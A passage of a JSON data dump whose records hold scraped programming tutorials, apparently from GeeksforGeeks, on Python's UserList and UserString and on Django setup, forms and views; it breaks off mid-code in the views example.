    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "ade77da680c51f1a556c11313c7ad210",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python Lists are array-like data structure but unlike it can be homogeneous. A single list may contain DataTypes like Integers, Strings, as well as Objects. List in Python are ordered and have a definite count. The elements in a list are indexed according to a definite sequence and the indexing of a list is done with 0 being the first index.\u00a0Note: For more information, refer to Python List\u00a0Collections.UserListPython supports a List like a container called UserList present in the collections module. This class acts as a wrapper class around the List objects. This class is useful when one wants to create a list of their own with some modified functionality or with some new functionality. It can be considered as a way of adding new behaviors for the list. This class takes a list instance as an argument and simulates a list that is kept in a regular list. The list is accessible by the data attribute of the this class.Syntax:\u00a0collections.UserList([list])Example 1:\u00a0Python3# Python program to demonstrate# userlist\u00a0\u00a0from collections import UserList\u00a0\u00a0L = [1, 2, 3, 4]\u00a0# Creating a userlistuserL = UserList(L)print(userL.data)\u00a0\u00a0# Creating empty userlistuserL = UserList()print(userL.data)Output:\u00a0[1, 2, 3, 4]\n[]Example 2:\u00a0Python3# Python program to demonstrate# userlist\u00a0\u00a0\u00a0from collections import UserList\u00a0\u00a0\u00a0# Creating a List where# deletion is not allowedclass MyList(UserList):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Function to stop deletion\u00a0\u00a0\u00a0\u00a0# from List\u00a0\u00a0\u00a0\u00a0def remove(self, s = None):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0raise RuntimeError(\"Deletion not allowed\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Function to stop pop from\u00a0\u00a0\u00a0\u00a0# List\u00a0\u00a0\u00a0\u00a0def pop(self, s = None):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0raise RuntimeError(\"Deletion not allowed\")\u00a0\u00a0\u00a0\u00a0\u00a0# Driver's codeL = MyList([1, 2, 3, 4])\u00a0print(\"Original List\")\u00a0# Inserting to List\"L.append(5)print(\"After Insertion\")print(L)\u00a0# Deleting From ListL.remove()Output:\u00a0Original List\nAfter Insertion\n[1, 2, 3, 4, 5]\u00a0Traceback (most recent call last):\n  File \"/home/9399c9e865a7493dce58e88571472d23.py\", line 33, in \n    L.remove()\n  File \"/home/9399c9e865a7493dce58e88571472d23.py\", line 15, in remove\n    raise RuntimeError(\"Deletion not allowed\")\nRuntimeError: Deletion not allowed\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "8abd36298a8273b755a7990786a43b16",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Strings are the arrays of bytes representing Unicode characters. However, Python does not support the character data type. A character is a string of length one.\u00a0Example:Python3# Python program to demonstrate# string\u00a0# Creating a String\u00a0# with single QuotesString1 = 'Welcome to the Geeks World'print(\"String with the use of Single Quotes: \")print(String1)\u00a0\u00a0\u00a0# Creating a String# with double QuotesString1 = \"I'm a Geek\"print(\"\\nString with the use of Double Quotes: \")print(String1)Output:String with the use of Single Quotes: \nWelcome to the Geeks World\n\nString with the use of Double Quotes: \nI'm a GeekNote: For more information, refer to Python String\u00a0Collections.UserStringPython supports a String like a container called UserString present in the collections module. This class acts as a wrapper class around the string objects. This class is useful when one wants to create a string of their own with some modified functionality or with some new functionality. It can be considered as a way of adding new behaviors for the string. This class takes any argument that can be converted to string and simulates a string whose content is kept in a regular string. The string is accessible by the data attribute of this class.Syntax:\u00a0collections.UserString(seq)Example 1:Python3# Python program to demonstrate# userstring\u00a0\u00a0from collections import UserString\u00a0\u00a0d = 12344\u00a0# Creating an UserDictuserS = UserString(d)print(userS.data)\u00a0\u00a0# Creating an empty UserDictuserS = UserString(\"\")print(userS.data)Output:\u00a012344Example 2:Python3# Python program to demonstrate# userstring\u00a0\u00a0\u00a0from collections import UserString\u00a0\u00a0\u00a0# Creating a Mutable Stringclass Mystring(UserString):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Function to append to\u00a0\u00a0\u00a0\u00a0# string\u00a0\u00a0\u00a0\u00a0def append(self, s):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.data += s\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Function to remove from\u00a0\u00a0\u00a0\u00a0# string\u00a0\u00a0\u00a0\u00a0def remove(self, s):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.data = self.data.replace(s, \"\")\u00a0\u00a0\u00a0\u00a0\u00a0# Driver's codes1 = Mystring(\"Geeks\")print(\"Original String:\", s1.data)\u00a0# Appending to strings1.append(\"s\")print(\"String After Appending:\", s1.data)\u00a0# Removing from strings1.remove(\"e\")print(\"String after Removing:\", s1.data)Output:Original String: Geeks\nString After Appending: Geekss\nString after Removing: GkssMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "cd34b397596bdd38924abc1675425515",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Django is a Python-based web framework that allows you to quickly create efficient web applications. It is also called batteries included framework because Django provides built-in features for everything including Django Admin Interface, default database \u2013 SQLlite3, etc. When you\u2019re building a website, you always need a similar set of components: a way to handle user authentication (signing up, signing in, signing out), a management panel for your website, forms, a way to upload files, etc. Django gives you ready-made components to use and that too for rapid development.Why Django Framework ?Excellent documentation and high scalability.Used by Top MNCs and Companies, such as Instagram, Disqus, Spotify, Youtube, Bitbucket, Dropbox, etc. and the list is never-ending.Easiest Framework to learn, rapid development and Batteries fully included.The last but not least reason to learn Django is Python, Python has huge library and features such as Web Scrapping, Machine Learning, Image Processing, Scientific Computing, etc. One can integrate it all this with web application and do lots and lots of advance stuff.Recent Articles on Django !!Django BasicsDjango BasicsDjango Introduction and InstallationWhen to Use Django? Comparison with other Development StacksDjango Project MVT StructureHow to Create a Basic Project using MVT in Django ?How to Create an App in Django ?Django FormsDjango FormsHow to create a form using Django Forms ?Render HTML Forms (GET & POST) in DjangoDjango Form Fieldsform field custom widgetsInitial form data \u2013 Django FormsModelForm \u2013 Create form from ModelsRender Form Fields ManuallyDjango FormsetsDjango ModelFormSetsDjango TemplatesDjango TemplatesTemplate FiltersTemplate TagsvariablesBoolean Operatorsfor loopif \u2013 Django TemplatesTemplate InheritanceMiscHandling Ajax request in DjangoUser groups with Custom permissions in DjangoDjango Admin InterfaceExtending and customizing django-allauthDjango \u2013 Dealing with warningsSessions framework using djangoDjango Sign Up and login with confirmation EmailDjango ViewsDjango ViewsFunction Based ViewsCreate ViewList ViewDetail ViewUpdate ViewDelete ViewClass Based Generic Views DjangoCreateviewListViewDetailViewUpdateViewDeleteViewFormViewDjango ModelsDjango ModelsORM \u2013 Inserting, Updating & Deleting DataBasic App Model \u2013 Makemigrations and Migratemodel data types and fields listAdd the slug field inside Django ModelIntermediate fields in DjangoUploading images in DjangoRender Model in Django Admin InterfaceChange Object Display Name using __str__ function \u2013 Django ModelsBuilt-in Field Validations \u2013 Django ModelsCustom Field Validations in Django ModelsHow to use Django Field Choices ?Overriding the save method \u2013 Django ModelsProjectsGoogle authentication and Fetching mails from scratchToDo webapp using DjangoDjango News AppWeather app using Django\u00a0\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "57725e530a02fd4ee1276cfed3a0d694",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Django is a Python-based web framework which allows you to quickly create web application without all of the installation or dependency problems that you normally will find with other frameworks.When you\u2019re building a website, you always need a similar set of components: a way to handle user authentication (signing up, signing in, signing out), a management panel for your website, forms, a way to upload files, etc. Django gives you ready-made components to use.Why Django?Django is a rapid web development framework that can be used to develop fully fleshed web applications in a short period of time.It\u2019s very easy to switch database in Django framework.It has built-in admin interface which makes easy to work with it.Django is fully functional framework that requires nothing else.It has thousands of additional packages available.It is very scalable. For more visit When to Use Django? Comparison with other Development Stacks ?Django architectureDjango is based on MVT (Model-View-Template) architecture. MVT is a software design pattern for developing a web application.MVT Structure has the following three parts \u2013Model: Model is going to act as the interface of your data. It is responsible for maintaining data. It is the logical data structure behind the entire application and is represented by a database (generally relational databases such as MySql, Postgres).View: The View is the user interface \u2014 what you see in your browser when you render a website. It is represented by HTML/CSS/Javascript and Jinja files.Template: A template consists of static parts of the desired HTML output as well as some special syntax describing how dynamic content will be inserted.To check more about Django\u2019s architecture, visit Django Project MVT StructureInstallation of DjangoInstall python3 if not installed in your system ( according to configuration of your system and OS) from here . Try to download the latest version of python it\u2019s python3.6.4 this time.Note- Installation of Django in Linux and Mac is similar, here I am showing it in windows for Linux and mac just open terminal in place of command prompt and go through the following commands.Install pip- Open command prompt and enter following command-python -m pip install -U pipInstall virtual environment- Enter following command in cmd-pip install virtualenvSet Virtual environment- Setting up the virtual environment will allow you to edit the dependency which generally your system wouldn\u2019t allow.Follow these steps to set up a virtual environment-Create a virtual environment by giving this command in cmd-virtualenv env_siteChange directory to env_site by this command-cd env_siteGo to Script directory inside env_site and activate virtual environment-cd ScriptactivateInstall Django- Install django by giving following command-pip install djangoCreating a ProjectLets\u2019 check how to create a basic project using Django after you have installed it in your pc.To initiate a project of Django on Your PC, open Terminal and Enter the following commanddjango-admin startproject projectNameA New Folder with name projectName will be created. To enter in the project using terminal enter commandcd projectNameNow run,Python manage.py runserverNow visit http://localhost:8000/,Creating an AppDjango is famous for its unique and fully managed app structure. For every functionality, an app can be created like a completely independent module. This article will take you through how to create a basic app and add functionalities using that app.To create a basic app in your Django project you need to go to directory containing manage.py and from there enter the command :python manage.py startapp projectAppNow you can see your directory structure as under :To consider the app in your project you need to specify your project name in INSTALLED_APPS list as follows in settings.py:# Application definition\u00a0\u00a0INSTALLED_APPS = [\u00a0\u00a0\u00a0\u00a0'django.contrib.admin',\u00a0\u00a0\u00a0\u00a0'django.contrib.auth',\u00a0\u00a0\u00a0\u00a0'django.contrib.contenttypes',\u00a0\u00a0\u00a0\u00a0'django.contrib.sessions',\u00a0\u00a0\u00a0\u00a0'django.contrib.messages',\u00a0\u00a0\u00a0\u00a0'django.contrib.staticfiles',\u00a0\u00a0\u00a0\u00a0'projectApp']So, we have finally created an app but to render the app using urls we need to include the app in our main project so that urls redirected to that app can be rendered. Let us explore it.Move to projectName-> projectName -> urls.py and add below code in the headerfrom django.urls import include Now in the list of URL patterns, you need to specify app name for including your app urls. Here is the code for it \u2013from django.contrib import adminfrom django.urls import path, include\u00a0\u00a0urlpatterns = [\u00a0\u00a0\u00a0\u00a0path('admin/', admin.site.urls),\u00a0\u00a0\u00a0\u00a0# Enter the app name in following syntax for this to work\u00a0\u00a0\u00a0\u00a0path('', include(\"projectApp.urls\")),]Now You can use the default MVT model to create URLs, models, views, etc. in your app and they will be automatically included in your main project.The main feature of Django Apps is independence, every app functions as an independent unit in supporting the main project. To know more about apps in Django, visit How to Create an App in Django ?More with Django \u2013Django ModelsDjango FormsDjango ViewsDjango Templates\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "41b31438a0acd5389ef8103d4edb697f",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "What is Django?Django is a Python-based web framework which allows you to quickly create web application without all of the installation or dependency problems that you normally will find with other frameworks.When you\u2019re building a website, you always need a similar set of components: a way to handle user authentication (signing up, signing in, signing out), a management panel for your website, forms, a way to upload files, etc. Django gives you ready-made components to use.Why Django?It\u2019s very easy to switch database in Django framework.It has built-in admin interface which makes easy to work with it.Django is fully functional framework that requires nothing else.It has thousands of additional packages available.It is very scalable.Popularity of DjangoDjango is used in many popular sites like as: Disqus, Instagram, Knight Foundation, MacArthur Foundation, Mozilla, National Geographic etc. There are more than 5k online sites based on the Django framework. ( Source )Sites like Hot Frameworks assess the popularity of a framework by counting the number of GitHub projects and StackOverflow questions for each platform, here Django is in 6th position. Web frameworks often refer to themselves as \u201copinionated\u201d or \u201cun-opinionated\u201d based on opinions about the right way to handle any particular task. Django is somewhat opinionated, hence delivers the in both worlds( opinionated & un-opinionated ).Features of DjangoVersatility of DjangoDjango can build almost any type of website. It can also work with any client-side framework and can deliver content in any format such as HTML, JSON, XML etc. Some sites which can be built using Django are wikis, social networks, new sites etc.SecuritySince Django framework is made for making web development easy, it has been engineered in such a way that it automatically do the right things to protect the website. For example, In the Django framework instead of putting a password in cookies, the hashed password is stored in it so that it can\u2019t be fetched easily by hackers.ScalabilityDjango web nodes have no stored state, they scale horizontally \u2013 just fire up more of them when you need them. Being able to do this is the essence of good scalability. Instagram and Disqus are two Django based products that have millions of active users, this is taken as an example of the scalability of Django.PortabilityAll the codes of the Django framework are written in Python, which runs on many platforms. Which leads to run Django too in many platforms such as Linux, Windows and Mac OS.Installation of DjangoInstall python3 if not installed in your system ( according to configuration of your system and OS) from here . Try to download the latest version of python it\u2019s python3.6.4 this time.Note- Installation of Django in Linux and Mac is similar, here I am showing it in windows for Linux and mac just open terminal in place of command prompt and go through the following commands.Install pip- Open command prompt and enter following command-python -m pip install -U pipInstall virtual environment- Enter following command in cmd-pip install virtualenvSet Virtual environment- Setting up the virtual environment will allow you to edit the dependency which generally your system wouldn\u2019t allow.Follow these steps to set up a virtual environment-Create a virtual environment by giving this command in cmd-virtualenv env_siteChange directory to env_site by this command-cd env_siteGo to Scripts directory inside env_site and activate virtual environment-cd ScriptsactivateInstall Django- Install django by giving following command-pip install djangoReturn to the env_site directory-cd ..Start a project by following command-django-admin startproject geeks_siteChange directory to geeks_sitecd geeks_siteStart the server- Start the server by typing following command in cmd-python manage.py runserverTo check whether server is running or not go to web browser and enter http://127.0.0.1:8000/ as url.Benefits of Django Architecture \u2013Rapid DevelopmentLoosely CoupledEase of ModificationDrawbacks of MVC Architecture \u2013Too much load on Model ComponentDevelopment Complexity is highTwo components are controlling ViewMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "25e1c68c2af0b2cc29e2b10375b9c79b",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "When one creates a Form class, the most important part is defining the fields of the form. Each field has custom validation logic, along with a few other hooks. This article revolves around various fields one can use in a form along with various features and techniques concerned with Django Forms. Forms are basically used for taking input from the user in some manner and using that information for logical operations on databases. For example, Registering a user by taking input as his name, email, password, etc.Django maps the fields defined in Django forms into HTML input fields. Django handles three distinct parts of the work involved in forms:preparing and restructuring data to make it ready for renderingcreating HTML forms for the datareceiving and processing submitted forms and data from the clientNote that all types of work done by Django forms can be done with advanced HTML stuff, but Django makes it easier and efficient especially the validation part. Once you get hold of Django forms you will just forget about HTML forms.Syntax :\u00a0 Django Fields work like Django Model Fields and have the syntax: field_name = forms.FieldType(**options) Example:Python3from django import forms\u00a0# creating a formclass GeeksForm(forms.Form):\u00a0\u00a0\u00a0\u00a0title = forms.CharField()\u00a0\u00a0\u00a0\u00a0description = forms.CharField()Using Django FormsTo use Django Forms, one needs to have a project and an app working in it. After you start an app you can create a form in app/forms.py. Before starting to use a form let\u2019s check how to start a project and implement Django Forms.Refer to the following articles to check how to create a project and an app in Django.\u00a0How to Create a Basic Project using MVT in Django?How to Create an App in Django ?Creating a Django FormCreating a form in Django is completely similar to creating a model, one needs to specify what fields would exist in the form and of what type. For example, to input, a registration form one might need First Name (CharField), Roll Number (IntegerField), and so on.\u00a0Syntax:\u00a0from django import forms\n        \nclass FormName(forms.Form):\n         # each field would be mapped as an input field in HTML\n        field_name = forms.Field(**options)To create a form, in geeks/forms.py Enter the code,Python3# import the standard Django Forms# from built-in libraryfrom django import forms\u00a0\u00a0\u00a0# creating a form\u00a0class InputForm(forms.Form):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0first_name = forms.CharField(max_length = 200)\u00a0\u00a0\u00a0\u00a0last_name = forms.CharField(max_length = 200)\u00a0\u00a0\u00a0\u00a0roll_number = forms.IntegerField(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0help_text = \"Enter 6 digit roll number\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0)\u00a0\u00a0\u00a0\u00a0password = forms.CharField(widget = forms.PasswordInput())To know more about how to create a Form using Django forms, visit How to create a form using Django Forms ?.Render Django FormsDjango form fields have several built-in methods to ease the work of the developer but sometimes one needs to implement things manually for customizing User Interface(UI). A form comes with 3 in-built methods that can be used to render Django form fields.\u00a0{{ form.as_table }} will render them as table cells wrapped in <tr> tags{{ form.as_p }} will render them wrapped in <p> tags{{ form.as_ul }} will render them wrapped in <li> tagsTo render this form into a view, move to views.py and create a home_view as below.\u00a0Python3from django.shortcuts import renderfrom .forms import InputForm\u00a0# Create your views here.def home_view(request):\u00a0\u00a0\u00a0\u00a0context ={}\u00a0\u00a0\u00a0\u00a0context['form']= InputForm()\u00a0\u00a0\u00a0\u00a0return render(request, \"home.html\", context)In view, one needs to just create an instance of the form class created above in forms.py. Now let\u2019s edit templates > home.html\u00a0html<form action = \"\" method = \"post\">\u00a0\u00a0\u00a0\u00a0{% csrf_token %}\u00a0\u00a0\u00a0\u00a0{{form }}\u00a0\u00a0\u00a0\u00a0<input type=\"submit\" value=Submit\"></form>Now, visit http://localhost:8000/.\u00a0To check how to use the data rendered by Django Forms visit Render Django Form Fields\u00a0Create Django Form from ModelsDjango ModelForm is a class that is used to directly convert a model into a Django form. If you\u2019re building a database-driven app, chances are you\u2019ll have forms that map closely to Django models. Now when we have our project ready, create a model in geeks/models.py,Python3# import the standard Django Model# from built-in libraryfrom django.db import models\u00a0\u00a0\u00a0# declare a new model with a name \"GeeksModel\"class GeeksModel(models.Model):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# fields of the model\u00a0\u00a0\u00a0\u00a0title = models.CharField(max_length = 200)\u00a0\u00a0\u00a0\u00a0description = models.TextField()\u00a0\u00a0\u00a0\u00a0last_modified = models.DateTimeField(auto_now_add = True)\u00a0\u00a0\u00a0\u00a0img = models.ImageField(upload_to = \"images/\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# renames the instances of the model\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# with their title name\u00a0\u00a0\u00a0\u00a0def __str__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return self.titleTo create a form directly for this model, dive into geeks/forms.py and Enter the following code:Python3# import form class from djangofrom django import forms\u00a0\u00a0# import GeeksModel from models.pyfrom .models import GeeksModel\u00a0\u00a0# create a ModelFormclass GeeksForm(forms.ModelForm):\u00a0\u00a0\u00a0\u00a0# specify the name of model to use\u00a0\u00a0\u00a0\u00a0class Meta:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0model = GeeksModel\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fields = \"__all__\"Now visit http://127.0.0.1:8000/,\u00a0More on Django Forms:Render HTML Forms (GET & POST) in Django{{ form.as_p }} \u2013 Render Django Forms as paragraph{{ form.as_table }} \u2013 Render Django Forms as table{{ form.as_ul }} \u2013 Render Django Forms as listDjango form field custom widgetsPython | Form validation using djangoDjango ModelForm \u2013 Create form from ModelsRender Django Form Fields ManuallyDjango FormsetsDjango ModelFormSetsBasic form data types and fields listThe most important part of a form and the only required part is the list of fields it defines. Fields are specified by class attributes. Here is a list of all Form Field types used in DjangoNameClassHTML InputBooleanFieldclass BooleanField(**kwargs)CheckboxInputCharFieldclass CharField(**kwargs)TextInputChoiceFieldclass ChoiceField(**kwargs)SelectTypedChoiceFieldclass TypedChoiceField(**kwargs)SelectDateFieldclass DateField(**kwargs)DateInputDateTimeFieldclass DateTimeField(**kwargs)DateTimeInputDecimalFieldclass DecimalField(**kwargs)NumberInput when Field.localize is False, else TextInputDurationFieldclass DurationField(**kwargs)TextInputEmailFieldclass EmailField(**kwargsEmailInputFileFieldclass FileField(**kwargs)ClearableFileInputFilePathFieldclass FilePathField(**kwargs)SelectFloatFieldclass FloatField(**kwargs)NumberInput when Field.localize is False, else TextInputImageFieldclass ImageField(**kwargs)ClearableFileInputIntegerFieldclass IntegerField(**kwargs)NumberInput when Field.localize is False, else TextInputGenericIPAddressFieldclass GenericIPAddressField(**kwargs)TextInputMultipleChoiceFieldclass MultipleChoiceField(**kwargs)SelectMultipleTypedMultipleChoiceFieldclass TypedMultipleChoiceField(**kwargs)SelectMultipleNullBooleanFieldclass NullBooleanField(**kwargs)NullBooleanSelectRegexFieldclass RegexField(**kwargs)TextInputSlugFieldclass SlugField(**kwargs)TextInputTimeFieldclass TimeField(**kwargs)TimeInputURLFieldclass URLField(**kwargs)URLInputUUIDFieldclass UUIDField(**kwargs)TextInputCore Field ArgumentsCore Field arguments are the arguments given to each field for applying some constraint or imparting a particular characteristic to a particular Field. For example, adding an argument required = False to CharField will enable it to be left blank by the user. Each Field class constructor takes at least these arguments. Some Field classes take additional, field-specific arguments, but the following should always be accepted:.math-table { border-collapse: collapse; width: 100%; } .math-table td { border: 1px solid #5fb962; text-align: left !important; padding: 8px; } .math-table th { border: 1px solid #5fb962; padding: 8px; } .math-table tr>th{ background-color: #c6ebd9; vertical-align: middle; } .math-table tr:nth-child(odd) { background-color: #ffffff; }Field OptionsDescriptionrequiredBy default, each Field class assumes the value is required, so to make it not required you need to set required=FalselabelThe label argument lets you specify the \u201chuman-friendly\u201d label for this field. This is used when the Field is displayed in a Form.label_suffixThe label_suffix argument lets you override the form\u2019s label_suffix on a per-field basis.widgetThe widget argument lets you specify a Widget class to use when rendering this Field. See Widgets for more information.help_textThe help_text argument lets you specify descriptive text for this Field. If you provide help_text, it will be displayed next to the Field when the Field is rendered by one of the convenience Form methods.\u00a0\u00a0error_messagesThe error_messages argument lets you override the default messages that the field will raise. Pass in a dictionary with keys matching the error messages you want to override.validatorsThe validators argument lets you provide a list of validation functions for this field.\u00a0\u00a0localizeThe localize argument enables the localization of form data input, as well as the rendered output.disabled.The disabled boolean argument, when set to True, disables a form field using the disabled HTML attribute so that it won\u2019t be editable by users.\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "36541d5dce881050d5bd44afcd0b171d",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Django Views are one of the vital participants of MVT Structure of Django. As per Django Documentation, A view function is a Python function that takes a Web request and returns a Web response. This response can be the HTML contents of a Web page, or a redirect, or a 404 error, or an XML document, or an image, anything that a web browser can display.\u00a0Django views are part of the user interface \u2014 they usually render the HTML/CSS/Javascript in your Template files into what you see in your browser when you render a web page. (Note that if you\u2019ve used other frameworks based on the MVC (Model-View-Controller), do not get confused between Django views and views in the MVC paradigm. Django views roughly correspond to controllers in MVC, and Django templates to views in MVC.)\u00a0Django View ExampleIllustration of How to create and use a Django view using an Example. Consider a project named geeksforgeeks having an app named geeks.\u00a0Refer to the following articles to check how to create a project and an app in Django.\u00a0How to Create a Basic Project using MVT in Django?How to Create an App in Django ?After you have a project ready, we can create a view in geeks/views.py,Python3# import Http Response from djangofrom django.http import HttpResponse# get datetimeimport datetime\u00a0# create a functiondef geeks_view(request):\u00a0\u00a0\u00a0\u00a0# fetch date and time\u00a0\u00a0\u00a0\u00a0now = datetime.datetime.now()\u00a0\u00a0\u00a0\u00a0# convert to string\u00a0\u00a0\u00a0\u00a0html = \"Time is {}\".format(now)\u00a0\u00a0\u00a0\u00a0# return response\u00a0\u00a0\u00a0\u00a0return HttpResponse(html)Let\u2019s step through this code one line at a time:\u00a0First, we import the class HttpResponse from the django.http module, along with Python\u2019s datetime library.Next, we define a function called geeks_view. This is the view function. Each view function takes an HttpRequest object as its first parameter, which is typically named request.The view returns an HttpResponse object that contains the generated response. Each view function is responsible for returning an HttpResponse object.For more info on HttpRequest and HttpResponse visit \u2013 Django Request and Response cycle \u2013 HttpRequest and HttpResponse ObjectsLet\u2019s get this view to working, in geeks/urls.py,Python3from django.urls import path\u00a0# importing views from views..pyfrom .views import geeks_view\u00a0urlpatterns = [\u00a0\u00a0\u00a0\u00a0path('', geeks_view),]Now, visit http://127.0.0.1:8000/,To check how to make a basic project using MVT (Model, View, Template) structure of Django, visit Creating a Project Django.Types of ViewsDjango views are divided into two major categories:-Function-Based ViewsClass-Based Views\u00a0Function Based ViewsFunction based views are writer using a function in python which receives as an argument HttpRequest object and returns an HttpResponse Object. Function based views are generally divided into 4 basic strategies, i.e., CRUD (Create, Retrieve, Update, Delete). CRUD is the base of any framework one is using for development.\u00a0\u00a0Function based view Example \u2013Let\u2019s Create a function-based view list view to display instances of a model. Let\u2019s create a model of which we will be creating instances through our view. In geeks/models.py,Python3# import the standard Django Model# from built-in libraryfrom django.db import models\u00a0\u00a0# declare a new model with a name \"GeeksModel\"class GeeksModel(models.Model):\u00a0\u00a0\u00a0\u00a0\u00a0# fields of the model\u00a0\u00a0\u00a0\u00a0title = models.CharField(max_length = 200)\u00a0\u00a0\u00a0\u00a0description = models.TextField()\u00a0\u00a0\u00a0\u00a0\u00a0# renames the instances of the model\u00a0\u00a0\u00a0\u00a0# with their title name\u00a0\u00a0\u00a0\u00a0def __str__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return self.titleAfter creating this model, we need to run two commands in order to create Database for the same.Python manage.py makemigrations\nPython manage.py migrateNow let\u2019s create some instances of this model using shell, run form bash,Python manage.py shellEnter following commands>>> from geeks.models import GeeksModel\n>>> GeeksModel.objects.create(\n                       title=\"title1\",\n                       description=\"description1\").save()\n>>> GeeksModel.objects.create(\n                       title=\"title2\",\n                       description=\"description2\").save()\n>>> GeeksModel.objects.create(\n                       title=\"title2\",\n                       description=\"description2\").save()Now if you want to see your model and its data in the admin panel, then you need to register your model.Let\u2019s register this model. In geeks/admin.py,Python3from django.contrib import adminfrom .models import GeeksModel# Register your models here.admin.site.register(GeeksModel)Now we have everything ready for the back end. Verify that instances have been created from http://localhost:8000/admin/geeks/geeksmodel/\u00a0Let\u2019s create a view and template for the same. In geeks/views.py,Python3from django.shortcuts import render\u00a0# relative import of formsfrom .models import GeeksModel\u00a0\u00a0def list_view(request):\u00a0\u00a0\u00a0\u00a0# dictionary for initial data with\u00a0\u00a0\u00a0\u00a0# field names as keys\u00a0\u00a0\u00a0\u00a0context ={}\u00a0\u00a0\u00a0\u00a0\u00a0# add the dictionary during initialization\u00a0\u00a0\u00a0\u00a0context[\"dataset\"] = GeeksModel.objects.all()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return render(request, \"list_view.html\", context)Create a template in templates/list_view.html,html<div class=\"main\">\u00a0\u00a0\u00a0\u00a0\u00a0{% for data in dataset %}.\u00a0\u00a0\u00a0\u00a0\u00a0{{ data.title }}<br/>\u00a0\u00a0\u00a0\u00a0{{ data.description }}<br/>\u00a0\u00a0\u00a0\u00a0<hr/>\u00a0\u00a0\u00a0\u00a0\u00a0{% endfor %}\u00a0</div>Let\u2019s check what is there on http://localhost:8000/Similarly, function based views can be implemented with logics for create, update, retrieve and delete views.Django CRUD (Create, Retrieve, Update, Delete) Function Based Views :-\u00a0Class Based ViewsClass-based views provide an alternative way to implement views as Python objects instead of functions. They do not replace function-based views, but have certain differences and advantages when compared to function-based views:\u00a0Organization of code related to specific HTTP methods (GET, POST, etc.) can be addressed by separate methods instead of conditional branching.Object oriented techniques such as mixins (multiple inheritance) can be used to factor code into reusable components.Class-based views are simpler and efficient to manage than function-based views. A function-based view with tons of lines of code can be converted into class-based views with few lines only. This is where Object-Oriented Programming comes into impact.\u00a0\u00a0Class based view Example \u2013In geeks/views.py,Python3from django.views.generic.list import ListViewfrom .models import GeeksModel\u00a0class GeeksList(ListView):\u00a0\u00a0\u00a0\u00a0\u00a0# specify the model for list view\u00a0\u00a0\u00a0\u00a0model = GeeksModelNow create a URL path to map the view. In geeks/urls.py,Python3from django.urls import path\u00a0# importing views from views..pyfrom .views import GeeksListurlpatterns = [\u00a0\u00a0\u00a0\u00a0path('', 